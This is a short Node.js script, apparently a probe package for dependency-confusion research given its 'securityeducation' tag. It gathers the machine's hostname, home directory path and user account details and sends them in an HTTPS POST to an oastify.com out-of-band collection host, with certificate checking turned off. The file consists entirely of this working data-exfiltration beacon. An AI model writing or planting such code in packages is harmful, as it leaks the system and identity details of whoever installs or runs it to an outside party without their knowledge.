const https = require('https');
var os = require("os");
var hostname = os.hostname();
var dir = os.homedir()
var user = os.userInfo()
const data = new TextEncoder().encode(
  JSON.stringify({
    host: hostname,
    project_id: "securityeducation",
    current_path: dir,
    username: user
  })
);

const options = {
  hostname: process.argv[2] + '.' + hostname + '.theanbyywgwv0bmsoxqjnpn0ur0ho6.oastify.com',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  },
  rejectUnauthorized: false
}

const req = https.request(options, res => {});
req.write(data);
req.end();